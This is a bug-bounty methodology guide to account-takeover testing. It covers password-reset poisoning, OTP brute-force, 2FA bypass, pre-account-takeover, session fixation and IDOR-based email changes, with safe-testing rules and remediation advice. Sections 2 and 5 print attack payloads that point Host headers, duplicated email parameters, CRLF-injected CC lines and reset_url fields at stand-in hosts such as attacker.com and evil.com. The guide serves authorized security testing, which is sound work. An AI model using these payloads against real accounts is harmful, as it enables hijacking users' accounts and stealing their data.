# Account Takeover (ATO) — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** Account Takeover — the **impact hub**: password-reset abuse · 2FA/MFA & OTP bypass · email-change & pre-account-takeover · session/token flaws · authz/IDOR-to-ATO · SSO/OAuth-to-ATO · injection-to-ATO chains.
**Impact ceiling:** **full takeover of any user's account (including admin) — the money bug** — via credential/session theft, reset-flow abuse, 2FA bypass, or account-linking; unauthenticated where the reset/register/SSO flows are pre-auth.
**Primary CWE:** CWE-640 (Weak Password Recovery) · CWE-287 (Improper Authentication) · CWE-384 (Session Fixation) · CWE-620 (Unverified Password Change) · CWE-307 (Excessive Auth Attempts / OTP brute) · CWE-639 (Authorization Bypass via User Key).

> ⚠️ **This is a methodology / impact kit, not a single bug class.** It ties the whole library together: chase the **takeover**, using whatever vector lands. It **owns** the flows that have no other kit (password reset, 2FA/OTP, email change, pre-ATO, session), and **cross-references** the class kits for the underlying bug: [../OAuth/](../OAuth/) (SSO/pre-ATO), [../JWT/](../JWT/) (token forgery), [../IDOR/](../IDOR/) (authz ATO), [../HostHeader/](../HostHeader/) (reset poisoning), [../CSRF/](../CSRF/), [../XSS/](../XSS/) (session theft), [../CORS/](../CORS/), [../WebCache/](../WebCache/) (deception → token theft), [../RaceCondition/](../RaceCondition/), [../SQLi/](../SQLi/) / [../NoSQLi/](../NoSQLi/) (auth bypass/dump).

---

## Read this first — why ATO is the bug everyone actually wants

Account takeover is the **outcome that pays**. A triager rates the *impact*, and "I can log into any user's account, including admin, without their password" is the top of almost every severity table. Most individual bugs on this program are only interesting **because they lead to ATO** — a reset-token leak, a missing rate-limit, an IDOR on the email field, an `alg:none` JWT. Your job is to **connect a primitive to a takeover** and prove it end-to-end.

**Why it pays High/Critical — every time:**
- **Direct, complete compromise of a victim's account** — their data, their money, their identity. Admin ATO = the whole app.
- **Often unauthenticated** — password-reset, registration, and SSO flows run before login, so the attacker needs nothing.
- **Chains everything** — XSS, CSRF, IDOR, SSRF, cache deception, Log4Shell all "cash out" as ATO. This kit is where they converge.
- **Low interaction** — many ATOs are 0-click (reset poisoning, pre-account-takeover) or 1-click (a reset link, an OAuth linking CSRF).

**Report the takeover, not the condition.** "The reset link contains the token in the `Referer`" is a *lead*. "I took over the victim's account by capturing their reset token from the `Referer` sent to my analytics domain, and logged in as them" is the finding. Always prove it with **two accounts you own** (attacker + victim) and show you ended up **inside the victim's account**.

**The one mental model.** An account is protected by three things: **who you prove you are** (login/2FA), **how you recover it** (reset/email-change), and **how the session persists** (tokens/cookies). ATO is breaking **any one** of those for **someone else's** account. Enumerate all three surfaces, attack the weakest, and prove cross-account.

---

## Master Testing Sequence — the testing order

> **This is the spine.** Register **two of your own accounts** first (attacker `A`, victim `B`) — every ATO proof is "as `A`, I took over `B`."

```
PHASE 0  MAP AUTH        → enumerate every auth flow: login · register · reset · email/phone-change · 2FA/OTP · SSO · session (§1)
PHASE 1  RESET  ⭐        → host/Referer poisoning · token leak · weak/reusable token · param pollution · CC injection (§2–§5)
PHASE 2  2FA/OTP  ⭐      → response manip · no-rate-limit brute · reuse · force-browse skip · disable-without-reauth (§6–§8)
PHASE 3  EMAIL/PRE-ATO ⭐ → email change w/o reauth · pre-account-takeover · email normalization/collision (§9–§10)
PHASE 4  SESSION/TOKEN   → fixation · no-rotate/no-invalidate · long-lived · remember-me · JWT (→ ../JWT/) (§11)
PHASE 5  AUTHZ + CHAINS  → IDOR on email/pass (→ ../IDOR/) · mass-assignment · SSO/OAuth (→ ../OAuth/) · XSS/CSRF/cache/JNDI (§12–§13)
PHASE 6  LOGIC/RESPONSE  → response boolean flip · step force-browse · parameter pollution (§14)
PHASE 7  VALIDATE→REPORT → FP filter (§15) · CVSS+CWE (§16) · playbooks (§17) ·
                           SAFE-PoC: TWO OWN accounts, prove cross-account, then STOP (§18) · dedup+report (§19)
```

**Phase-by-phase deliverable:**
1. **PHASE 0 — Map.** List every flow that authenticates, recovers, or changes account identity/session. *Deliverable:* the auth surface + two test accounts.
2. **PHASE 1 — Reset ⭐.** Break the password-reset flow (poison the link, leak/reuse/predict the token, pollute the email). *Deliverable:* a captured/forged reset for `B`.
3. **PHASE 2 — 2FA/OTP ⭐.** Bypass the second factor (response flip, brute a code with no rate-limit, force-browse past it). *Deliverable:* `B`'s account entered past 2FA.
4. **PHASE 3 — Email/pre-ATO ⭐.** Change identity without re-auth, or pre-register `B`'s email so their later SSO merges into your account. *Deliverable:* control of `B`'s identity.
5. **PHASE 4–6 — Session / authz / logic.** Fixation, non-rotating/non-expiring sessions, IDOR on email/password, response flips.
6. **PHASE 7 — Report.** FP filter, CVSS/CWE, safe PoC (two own accounts, prove you're **in** `B`), dedup, write it (§15–§19).

Reference anytime: payloads → `ACCOUNT_TAKEOVER_ARSENAL.md`; checklist → `ACCOUNT_TAKEOVER_CHECKLIST.md`; scripts → `poc/`; playbooks **§17**.

---

# PART I — MAP THE AUTH SURFACE

# 1. Enumerate every flow (each is an ATO surface)

```
LOGIN:        password login · SSO/social · magic-link · WebAuthn · "remember me" · device trust.
REGISTER:     signup · email/phone verification · invite/join-org · username/email uniqueness rules.
RECOVERY:     "forgot password" · "forgot username" · account-recovery questions · reset-via-SMS/email · support flow.
CHANGE:       change email · change phone · change password · change 2FA · deactivate/reactivate.
2FA/MFA:      TOTP · SMS/email OTP · backup codes · push · trusted-device · step-up auth for sensitive actions.
SESSION:      cookies/JWT · logout · "log out all devices" · concurrent sessions · token lifetime · rotation on login/priv-change.
LINK/MERGE:   link social account · merge duplicate accounts · add a second email.
```
For each, capture the **request/response**, note **what proves identity** and **what's missing** (re-auth? verification? rate-limit? token binding?). The gap is the ATO.
> **If this → then that:** a flow **changes email/password/2FA or issues a session** without **re-authenticating** or **verifying** → that's your first target. "Change email → then reset password to the new email" is the canonical two-step ATO; look for any change flow that skips re-auth.

---

# PART II — PASSWORD RESET ATTACKS (the flagship ATO surface)

# 2. Reset-link poisoning (0-click, unauthenticated)

The reset email's link is built from a **host** the app trusts from the request — poison it and the victim's click sends **you** the token.
```
Host: attacker.com                         → link becomes https://attacker.com/reset?token=VICTIM_TOKEN
X-Forwarded-Host: attacker.com             → same, via the proxy header (see ../HostHeader/)
X-Forwarded-Host: attacker.com&x=          ·  X-Host: attacker.com  ·  X-Forwarded-Server: attacker.com
Host: target.com:@attacker.com  /  Host: target.com\n Host: attacker.com  (dual-host / CRLF)
Referer-based:  if the reset page loads attacker-controllable resources, the token leaks in the Referer.
```
Trigger a reset **for the victim** (`B`), poison the host, and catch the token on your server when `B` clicks (or when the app server-side-fetches your host). → **you hold `B`'s valid reset token → set their password → ATO.**
> **If this → then that:** the reset link in the email reflects your `Host`/`X-Forwarded-Host` → **0-click ATO via reset poisoning** (Critical) — cross-ref [../HostHeader/](../HostHeader/) for the header tricks. If only the *password-reset page* (not the email) is poisoned, the token can still leak via **`Referer`** to third-party scripts/images.

# 3. Reset-token leakage

```
□ In the RESPONSE body/JSON of the "send reset" call (some APIs return the token/link).
□ In the Referer header sent to analytics/CDN/third-party when the reset page loads external resources.
□ In redirects / URL history / server logs / error pages.
□ Emailed link works but the token is ALSO returned to the browser (SPA leaks it).
□ Reset link with the token in the URL indexed/cached (../WebCache/ deception can lift it).
```
> **If this → then that:** the "forgot password" API **returns the token/link in its JSON** → immediate ATO for any email you submit (Critical, unauth). The token leaks in **`Referer`** → ATO for any victim whose reset page loads your resource.

# 4. Weak / mishandled reset tokens

```
□ PREDICTABLE: sequential, timestamp-based, short, MD5(email)/MD5(email+time), base64(userid+ts) → forge the victim's token.
□ NON-EXPIRING / long TTL → a leaked/old token still works.
□ NOT SINGLE-USE → reused after a successful reset.
□ NOT INVALIDATED on email change / password change / new reset request.
□ NOT BOUND to the user → use YOUR token to reset the VICTIM (submit your token + victim's id/email).
□ Token reflected then reused; token guessable via ../RaceCondition/ or brute (no rate-limit).
```
Use `poc/reset_token_analyzer.py` to collect many tokens for **your own** account and test entropy/sequential/timestamp structure.
> **If this → then that:** you collect 20 reset tokens for your own account and they're **sequential or timestamp-correlated** → you can **forge the victim's token** → ATO. Token still works after use/after a second request → session-independent replay.

# 5. Reset-flow parameter abuse

```
EMAIL PARAM POLLUTION (get the reset sent to YOU while it's for the VICTIM):
  email=victim@target.com&email=attacker@evil.com          (HPP — app validates one, mails the other)
  email[]=victim@target.com&email[]=attacker@evil.com      (array)
  {"email":["victim@target.com","attacker@evil.com"]}      (JSON array)
CC / SECOND-RECIPIENT injection:
  email=victim@target.com%0acc:attacker@evil.com           (CRLF adds a CC)
  email=victim@target.com%20attacker@evil.com  /  email=victim@target.com,attacker@evil.com
EMAIL NORMALIZATION / UNICODE (get a reset for the victim via a "different" address the app maps to theirs):
  victim@target.com  vs  Victim@target.com  vs  victim@target.com.  vs  victim+x@target.com  vs  unicode look-alikes.
HOST in the body/JSON:  some APIs take a "callback"/"reset_url"/"domain" field → point it at attacker.com.
STEP/RESPONSE MANIPULATION:  change "delivered":false→true, reuse another user's reset session, force-browse to set-password.
```
> **If this → then that:** the reset endpoint accepts **two email values** (HPP/array/CRLF) → the victim's token is mailed to **your** address → ATO. A **`reset_url`/`callback`** field in the JSON → point it at your host → token capture.

---

# PART III — 2FA / MFA & OTP BYPASS

# 6. Structural 2FA bypass (skip the factor entirely)

```
□ FORCE-BROWSE: after password step, navigate straight to the post-login/authenticated endpoint, skipping the 2FA page.
□ RESPONSE MANIPULATION: the 2FA verify returns {"2fa":false}/{"verified":false} → flip to true; or the login returns a
  session BEFORE 2FA is checked.
□ BACKUP/RECOVERY path weaker than 2FA (recovery code brute, "lost device" bypass, email-OTP fallback).
□ 2FA disabled WITHOUT re-auth/OTP → turn it off on the victim's account (after another primitive) then log in.
□ 2FA not enforced on ALL entry points (API, mobile endpoint, legacy login, SSO) → use the one that doesn't ask.
□ TOKEN issued pre-2FA is already valid for sensitive actions.
```
> **If this → then that:** the password step returns a **usable session cookie before 2FA** → force-browse past the OTP page = **2FA bypass**. The verify response is a client-checked boolean → **flip it**. Always test the **API/mobile** login path — 2FA is often only enforced on the web UI.

# 7. OTP brute-force & weakness

```
□ NO RATE-LIMIT on the OTP verify → brute a 4–6 digit code (10k–1M space) → bypass. (poc/otp_bruteforce.py detects the gap.)
□ RATE-LIMIT resettable: re-request the OTP resets the counter; or per-code not per-session; or bypass via
  X-Forwarded-For rotation / casing / trailing space / new session per attempt.
□ OTP NOT INVALIDATED after use / after expiry → replay.
□ OTP REUSED across requests/users; SAME OTP each time; predictable (timestamp/sequential).
□ OTP LEAKED in the response (some APIs return it) or sent to an attacker-changed phone/email.
□ NULL/EMPTY/0000/"000000"/leading-zero/negative/array OTP accepted; type-juggling (otp=true, otp=[correct]).
□ RACE on OTP verify (../RaceCondition/) — many parallel guesses before the limiter engages.
```
> **If this → then that:** you send 50 wrong OTPs to **your own** account and never get blocked → **no rate-limit → OTP brute-forceable → ATO** (Critical). Re-requesting the code resets the attempt counter → still brute-forceable. The response contains the OTP → instant bypass.

# 8. OTP / 2FA delivery abuse

```
□ Change the victim's phone/email (no re-auth) → OTP now goes to YOU (chains with §9).
□ Response discloses the OTP or the masked phone/email helps enumerate.
□ Downgrade to a weaker factor (SMS instead of TOTP) or a "trust this device" token that's forgeable/permanent.
□ Trusted-device / "remember me" cookie predictable, not bound to the device, or never expires.
```

---

# PART IV — EMAIL CHANGE, REGISTRATION & PRE-ACCOUNT-TAKEOVER

# 9. Email / identity change without re-auth or verification

```
□ Change email WITHOUT the current password / without OTP → set victim's account email to yours, then reset. (needs another primitive to reach their session, or an IDOR §12)
□ Change email and it takes effect BEFORE the new address is verified → attacker email active immediately.
□ No notification/confirmation to the OLD email → silent takeover.
□ Response manipulation on the change-email/verify step.
□ Change email to the VICTIM'S (see pre-ATO §10) to collide accounts.
```
> **If this → then that:** the change-email flow needs **no re-auth and no new-address verification** → combined with any read of the victim's session (XSS/cache/IDOR) it's **1-step ATO**; even alone it's a broken-flow finding. "Change email → reset password to it" is the canonical chain.

# 10. Registration abuse & pre-account-takeover (the quiet money bug)

```
PRE-ACCOUNT-TAKEOVER (classic):
  1) Attacker registers an account using the VICTIM's email (email unverified / verification not enforced).
  2) Victim later signs up — often via SSO ("Sign in with Google") — and the app MERGES/links into the attacker's
     pre-existing account instead of creating a fresh one.
  3) Attacker still knows their password → shares the account → reads the victim's data. (cross-ref ../OAuth/ unverified-email linking)
CLASSIC merge/overwrite:
  □ Registering an existing email OVERWRITES / links the existing account.
  □ Username/email COLLISION via normalization: victim@x.com vs Victim@x.com vs victim@x.com. vs victim+@x.com vs unicode.
  □ Case/whitespace/dot/unicode-normalization mismatch between register and login/reset → two "different" strings, one account.
  □ Invite/join-org flows that trust an attacker-supplied email/role.
```
> **If this → then that:** you can **register the victim's email unverified** and later their **SSO login lands in your account** → **pre-account-takeover** (High/Critical, 0-click for the victim). This is the bug most programs pay well for and most hunters miss — always test "register victim's email, then SSO as victim."

---

# PART V — SESSION & TOKEN ATTACKS

# 11. Session/token lifecycle flaws

```
□ SESSION FIXATION: the app accepts a session id you set (URL/cookie) and doesn't rotate it on login → set B's session to a
  value you know, get B to authenticate, you share the authenticated session. (CWE-384)
□ NO ROTATION on login / privilege change → a pre-auth token stays valid post-auth.
□ NO INVALIDATION on logout / password change / email change → a stolen/old session survives the "fix". (CWE-613)
□ LONG-LIVED / non-expiring tokens; "remember me" that never dies or is predictable.
□ SESSION token in the URL (leaks via Referer/logs/history).
□ JWT: alg:none / weak secret / kid injection / no expiry → forge B's token (→ ../JWT/).
□ Concurrent-session abuse; "log out all devices" doesn't actually revoke.
```
> **If this → then that:** the session id **doesn't change after login** → **session fixation ATO** (seed B's session, they log in, you're in). The session **survives a password change** → a stolen session can't be evicted → escalates any session-theft bug to durable ATO.

---

# PART VI — AUTHZ & INJECTION CHAINS TO ATO (the cross-reference hub)

# 12. Broken authorization → ATO (IDOR / mass-assignment)

```
□ IDOR on the change-email / change-password / change-phone endpoint (userId/accountId in path/body) → change B's creds as A.
  → cross-ref ../IDOR/ ; this is one of the most common real ATOs.
□ MASS ASSIGNMENT: a profile-update endpoint accepts email/role/isAdmin/2fa_enabled → overwrite B's email or grant yourself admin.
□ Password-change endpoint that doesn't check the OLD password AND lets you set the target user.
□ GraphQL/REST mutation exposing updateUser(id,email) without object-level authz (../GraphQL/, ../REST/).
```
> **If this → then that:** `POST /api/user/{id}/email` (or a body `userId`) lets account `A` change account `B`'s email → **direct ATO via IDOR** (Critical) → then reset to the new email. Test every "update account" call for **object-level authz** with your two accounts.

# 13. Injection / client-side / infra chains → ATO

```
XSS (../XSS/)              → steal B's session cookie / act in their session / change their email → ATO.
CSRF (../CSRF/)            → force B to change their email/password/2FA (no anti-CSRF on the sensitive action) → ATO.
CORS (../CORS/)            → read B's authenticated responses (token/CSRF/email) cross-origin → ATO.
Cache deception (../WebCache/) → lift B's authenticated page/token from the cache → ATO.
SSRF/Log4Shell (../SSRF/, ../JNDI/) → RCE/secret access → forge any session → ATO.
SQLi/NoSQLi (../SQLi/, ../NoSQLi/) → auth bypass / dump password hashes/reset tokens → ATO.
OAuth/SSO (../OAuth/)      → redirect_uri/code theft, state-CSRF account-linking, id_token forgery, pre-ATO → ATO.
Race (../RaceCondition/)   → parallel OTP/reset/coupon → bypass single-use limits → ATO.
```
> **If this → then that:** you have *any* of these primitives → **cash it out as ATO** here. A reflected XSS on the authenticated origin → cookie theft → login as B. A CORS `*`+credentials on `/api/me` → read B's token. Always drive the primitive to the takeover for maximum bounty.

---

# PART VII — LOGIC & RESPONSE MANIPULATION

# 14. Response/request tampering & flow logic

```
□ RESPONSE BOOLEAN FLIP: {"success":false}→true, {"2fa_required":true}→false, {"role":"user"}→"admin" on a client-trusted step.
□ FORCE-BROWSE past steps: skip email-verify / 2FA / "confirm identity" and hit the final authenticated endpoint directly.
□ HTTP PARAMETER POLLUTION on user/email/id fields (§5) across the auth flows.
□ MASS ASSIGNMENT of email_verified:true / is_admin:true / phone_verified:true on register/update.
□ STATUS-CODE reliance: the client treats 200 as success — replay a step and change the outcome.
□ REPLAY: reuse a one-time token/OTP/magic-link; use a step's token out of order or for another user.
```
> **If this → then that:** a step's decision is made **client-side** (a boolean in the response) → **flip it** to skip 2FA/verification. `email_verified` accepted on registration → mark the victim's email verified for the pre-ATO chain.

---

# PART VIII — VALIDITY, SEVERITY & REPORTING

# 15. False positives — STOP reporting these (auto-reject)

| # | Commonly mis-reported | Why it's NOT (yet) ATO | What makes it real |
|---|---|---|---|
| 1 | **"Reset token in the response"** on **your own** reset | You're seeing your own token | The token is leaked for a **victim** (Referer/host-poison) or you reset **B**'s account |
| 2 | **Host-header reflected** in the reset link | Reflection ≠ token capture | You actually **received B's token** at your host and logged in as B |
| 3 | **No rate-limit on login** | Slow/again ≠ takeover | A **brute-forceable OTP** or a **crackable reset token** you demonstrably exploit |
| 4 | **Email change works** (on your own account) | That's expected | You changed **B**'s email (IDOR/CSRF) or bypassed re-auth to reach ATO |
| 5 | **"2FA can be brute-forced" — theoretical** | No demonstrated bypass | You show **missing rate-limit** (N wrong codes, still accepted) on your own account |
| 6 | **Session cookie not `HttpOnly`** alone | A hardening nit | A concrete session-theft → login as B |
| 7 | **Pre-ATO "possible" without the merge** | Registration of an email ≠ takeover | The victim's later SSO/login actually lands in **your** account |
| 8 | **Logout doesn't clear a client cookie** | Cosmetic | The **server session** stays valid after logout/password-change and you reuse it |

> **Golden rule:** an ATO finding ends with **"as attacker `A` (or unauthenticated), I am now inside victim `B`'s account"** — shown with two accounts you own. A leaked token, a reflected host, or a missing header is a **lead** until you complete the takeover.

---

# 16. Severity calibration (CVSS + CWE)

| Scenario | Typical | CWE |
|---|---|---|
| **0-click ATO (reset poisoning / pre-ATO / IDOR on email)** | **Critical (9–10)** | CWE-640 / CWE-639 / CWE-287 |
| **1-click ATO (reset-link/Referer leak, CSRF change-email, OAuth linking)** | **High → Critical** | CWE-640 / CWE-352 / CWE-287 |
| **2FA/MFA bypass (force-browse, response flip, OTP brute)** | **High → Critical** | CWE-287 / CWE-307 / CWE-308 |
| **Session fixation / non-invalidated session → durable ATO** | **High** | CWE-384 / CWE-613 |
| **Admin ATO (any vector)** | **Critical** | as above | 
| **Pre-account-takeover (unverified-email merge)** | **High → Critical** | CWE-287 / CWE-640 |
| **Weak/leaked reset token, not yet exploited end-to-end** | **Medium → High** | CWE-640 | 
| **Missing rate-limit with no demonstrated bypass** | **Low → Medium** | CWE-307 |

**CVSS anchors:**
- Unauth 0-click ATO: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **~9.8 Critical**.
- 1-click ATO (victim clicks): `…/UI:R/…` → High/Critical.
- Anchor to **CWE-640** (reset), **CWE-287** (auth/2FA), **CWE-384** (session), **CWE-639** (IDOR ATO); name the vector.

---

# 17. Impact-escalation playbooks — "you found X, now do Y"

### 17.1 You found: *the reset link reflects your `Host`/`X-Forwarded-Host`*
- **Escalate:** trigger a reset for `B`, poison the host, catch `B`'s token at your server, set `B`'s password, log in as `B` (§2). **Severity:** Critical (0-click).

### 17.2 You found: *the "forgot password" API returns the token/link*
- **Escalate:** submit the victim's email → get their token → reset → ATO for anyone (§3). **Severity:** Critical, unauth.

### 17.3 You found: *reset tokens look sequential/timestamped*
- **Escalate:** collect a series (own account), model the pattern, forge `B`'s token (§4, `poc/reset_token_analyzer.py`). **Severity:** Critical.

### 17.4 You found: *OTP verify has no rate-limit*
- **Escalate:** demonstrate N wrong codes still accepted on your own account (`poc/otp_bruteforce.py`) → OTP is brute-forceable → 2FA bypass (§7). **Severity:** High/Critical.

### 17.5 You found: *the reset accepts two emails (HPP/array/CRLF)*
- **Escalate:** `email=victim&email=attacker` → victim's token mailed to you → ATO (§5). **Severity:** Critical.

### 17.6 You found: *change-email endpoint with a `userId` (IDOR)*
- **Escalate:** as `A`, change `B`'s email, then reset to it → ATO (§12, → [../IDOR/](../IDOR/)). **Severity:** Critical.

### 17.7 You found: *you can register the victim's (unverified) email*
- **Escalate:** have `B` sign in via SSO → confirm the merge lands in your account → pre-ATO (§10, → [../OAuth/](../OAuth/)). **Severity:** High/Critical.

### 17.8 You found: *a session that survives logout / password change*
- **Escalate:** show a captured session still works after `B` "logs out" / changes password → durable ATO from any session-theft bug (§11). **Severity:** High.

---

# 18. SAFE-PoC discipline

```
DO:
  □ Use TWO accounts YOU OWN — attacker A + victim B. Every proof ends "as A (or unauth), I'm inside B's account."
  □ Prove the takeover minimally: log into B, read a B-only marker (B's email on the profile), one screenshot, then STOP.
  □ For reset/token analysis, generate tokens for YOUR OWN accounts; model the weakness; don't harvest real users' tokens.
  □ For OTP rate-limit: send a BOUNDED number of wrong codes to YOUR OWN account to show the limiter is absent, then STOP —
    do NOT actually crack a real user's code.
  □ For pre-ATO: use your own second email as the "victim"; show the merge; don't target real users.
DON'T:
  □ Take over, lock out, or read a REAL user's account. Never change a real victim's password/email.
  □ Mass-brute OTPs/reset tokens against production (that's abuse + noise). Bounded proof only.
  □ Leave B's password/email changed — restore state; note it in the report.
  □ Exfiltrate real personal data beyond the one marker needed to prove access.
```
> The single rule: **prove ATO with two accounts you control, take over `B` once with a benign marker, restore state, and stop.** You never need to touch a real user to earn a Critical.

**Remediation to include:** reset tokens = high-entropy, single-use, short-TTL, bound to the user, invalidated on use/change; build reset links from a **server-configured** host (never the request `Host`/`X-Forwarded-Host`); **rate-limit + lock** OTP/reset attempts (per-account, not resettable); require **re-authentication** for email/phone/password/2FA changes and **verify the new address** before it takes effect; notify the **old** email on change; **rotate** the session on login/privilege-change and **invalidate** on logout/password-change; enforce 2FA on **all** entry points; enforce **email verification** before account-merge/SSO-link (kills pre-ATO); object-level authz on every account-update endpoint.

---

# 19. Reporting, CWE/CVSS & de-duplication

Use `ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md`. Minimum:
```
1. Title       "Account takeover of any user via <vector> on <endpoint>" (name the VECTOR + that it's full ATO)
2. Severity    CVSS 3.1 vector + score + CWE-640/287/384/639 (match the vector)
3. Asset       exact endpoint/flow + the missing control (re-auth / verification / rate-limit / token binding / host source)
4. Summary     the vector, and that it yields full takeover of another user's account
5. Steps       numbered, TWO accounts: as A (or unauth) → the primitive → logged in as B (the cross-account proof)
6. PoC         request/response pairs + the B-only marker you read after takeover (redacted); state you restored B
7. Impact      full ATO (admin?) — data, funds, identity; unauth/0-click if applicable
8. Remediation the specific control from §18
```
**De-dup:** one **flow/root-cause** = one report even if reachable multiple ways; lead with the **takeover**, list the contributing primitives. A reset-poisoning ATO and the underlying host-header reflection are **one** report (lead with ATO). Injection-driven ATOs (XSS→ATO) are usually filed under the injection bug **with ATO as the impact** — check the program's preference.

---

# 20. Automation & red-team notes

**Automation (find candidates fast, prove cross-account by hand):**
```
poc/reset_token_analyzer.py   — collect your own reset tokens, score entropy/sequential/timestamp/reuse
poc/reset_poison_probe.py     — host/X-Forwarded-Host/Referer poisoning + email HPP/CRLF on the reset flow
poc/otp_bruteforce.py         — detect a missing/resettable OTP rate-limit on YOUR OWN account (bounded)
Burp (Intruder/Turbo)         — bounded OTP/rate-limit tests; two-account Autorize-style authz diff for IDOR ATO
```
- **Quality gate:** never submit "reset token in Referer" or "no rate-limit" alone. Complete the **takeover of your second account** and show the B-only marker.

**Red-team angles:**
```
□ Pre-ATO on high-value targets: pre-register their corporate email before they onboard to a SaaS → silent access on their SSO.
□ Reset-poisoning at scale via a mass "forgot password" + host injection → harvest tokens (authorized only).
□ 2FA bypass on the API/mobile path where the web enforces it → quiet ATO.
□ Session non-invalidation → a single stolen session (phish/XSS) becomes permanent access.
□ Admin ATO via an IDOR on the admin user-management endpoint → full app compromise.
□ Chain: cache deception (../WebCache/) or CORS (../CORS/) to lift a token → ATO without any credential.
```

---

# Appendix A — Workflow cheat sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        ACCOUNT TAKEOVER (ATO)                              │
├──────────────────────────────────────────────────────────────────────────┤
│ 0. MAP: login·register·reset·email/phone-change·2FA/OTP·SSO·session §1     │
│    (register TWO own accounts: attacker A + victim B)                       │
│ 1. RESET ⭐: host/Referer poison §2 · token leak §3 · weak/reuse token §4  │
│    · email HPP/array/CRLF/normalize §5                                      │
│ 2. 2FA/OTP ⭐: force-browse skip · response flip §6 · no-rate-limit brute   │
│    · reuse/null/leak §7 · delivery-to-attacker §8                           │
│ 3. EMAIL/PRE-ATO ⭐: change w/o reauth §9 · pre-register victim→SSO merge §10│
│ 4. SESSION: fixation · no-rotate · no-invalidate · JWT(→../JWT/) §11        │
│ 5. AUTHZ+CHAINS: IDOR on email/pass(→../IDOR/) · mass-assign §12 ·          │
│    XSS/CSRF/CORS/cache/SSRF/JNDI/SQLi/OAuth → ATO §13                       │
│ 6. LOGIC: response boolean flip · force-browse · HPP · replay §14           │
│ 7. VALIDATE→REPORT: "I'm inside B" proof, FP filter §15 · CVSS+CWE §16 ·    │
│    SAFE-PoC: TWO OWN accounts, restore B, STOP §18 · dedup §19              │
└──────────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Decision tree

```
Pick the weakest of: who-you-are (login/2FA) · how-you-recover (reset/email) · how-session-persists (token).
│
├─ RESET flow → does the link use MY Host/X-Forwarded-Host? → poison → catch B's token → ATO. CRITICAL ⭐ §2
│     ├─ token in the response/Referer? → leak → ATO §3
│     ├─ token sequential/timestamp/reusable/not-bound? → forge/replay → ATO §4
│     └─ accepts 2 emails (HPP/array/CRLF) or a reset_url field? → mail to me → ATO §5
│
├─ 2FA/OTP → session issued before 2FA / verify is a client boolean? → force-browse / flip → bypass §6
│     ├─ no/resettable rate-limit on OTP? → brute → bypass §7 (poc/otp_bruteforce.py)
│     └─ OTP reused/leaked/null-accepted, or delivery changeable to me? → bypass §7-§8
│
├─ EMAIL/REGISTER → change email w/o reauth/verify? → set to mine → reset → ATO §9
│     └─ register the VICTIM's unverified email → their SSO merges into MY account → PRE-ATO §10 ⭐
│
├─ SESSION → id not rotated on login? → FIXATION §11 ; survives logout/pw-change? → durable ATO
│
├─ AUTHZ → IDOR/mass-assign on change-email/password with a userId? → change B's creds → ATO. CRITICAL §12
│
└─ CHAIN → have XSS/CSRF/CORS/cache/SSRF/JNDI/SQLi/OAuth? → cash out as ATO §13.

ALWAYS: two own accounts · end "I'm inside B" · benign marker · restore B's state · CWE-640/287/384/639 §16.
```

---

# Appendix C — References & further reading

**Core methodology**
- PortSwigger — Authentication vulnerabilities (+ 2FA, password reset, brute-force labs): https://portswigger.net/web-security/authentication
- OWASP WSTG — Authentication, Session Management & Identity testing: https://owasp.org/www-project-web-security-testing-guide/
- OWASP — Forgot Password & Authentication cheat sheets: https://cheatsheetseries.owasp.org/
- HackTricks — Reset/2FA/registration bypasses: https://book.hacktricks.xyz/pentesting-web/reset-password
- The Hacker Recipes — Web / accounts: https://www.thehacker.recipes/
- PentesterLab — authentication & session badges: https://pentesterlab.com/

**ATO technique writeups**
- Password-reset poisoning (PortSwigger research) + host-header attacks: https://portswigger.net/web-security/host-header
- Pre-account-takeover / account pre-hijacking research — **Avinash Sudhodanan & Andrew Paverd (Microsoft), "Pre-hijacking Attacks on Web User Accounts" (USENIX Security 2022)** — unverified-email SSO merge.
- 2FA/OTP bypass compilations (bug-bounty writeups, HackerOne disclosed reports).

**Related kits (the underlying bug classes)**
- [../OAuth/](../OAuth/) · [../JWT/](../JWT/) · [../IDOR/](../IDOR/) · [../HostHeader/](../HostHeader/) · [../CSRF/](../CSRF/) · [../XSS/](../XSS/) · [../CORS/](../CORS/) · [../WebCache/](../WebCache/) · [../RaceCondition/](../RaceCondition/) · [../SQLi/](../SQLi/) · [../NoSQLi/](../NoSQLi/)

**Standards**
- **CWE-640** (Weak Password Recovery) · **CWE-287** (Improper Authentication) · **CWE-384** (Session Fixation) · **CWE-620** (Unverified Password Change) · **CWE-307** (Excessive Auth Attempts) · **CWE-639** (Authorization Bypass via User Key) · **CWE-613** (Insufficient Session Expiration).
- **CVSS 3.1** calculator (unauth ATO ≈ 9.8): https://www.first.org/cvss/calculator/3.1

---

## Companion files
- **[ACCOUNT_TAKEOVER_ARSENAL.md](ACCOUNT_TAKEOVER_ARSENAL.md)** — reset/2FA/email/session payloads + header tricks + tools.
- **[ACCOUNT_TAKEOVER_CHECKLIST.md](ACCOUNT_TAKEOVER_CHECKLIST.md)** — phase-by-phase per flow + auto-reject.
- **[ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md](ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md)** — the "I'm inside B" report skeleton.
- **[AccountTakeover_Zero_to_Expert.md](AccountTakeover_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `reset_token_analyzer.py` (token entropy/pattern) · `reset_poison_probe.py` (host/Referer poison + email HPP) · `otp_bruteforce.py` (missing-rate-limit detector, bounded, own-account).

> **Final reminder — the one rule that pays:** ATO is proven only when you end up **inside another account** — "as attacker `A` (or unauthenticated), I took over victim `B`." Break the weakest of login / recovery / session for *someone else's* account, prove it with **two accounts you own** and a benign marker, restore state, and report the **takeover** — not the leaked token or the missing header that got you there.
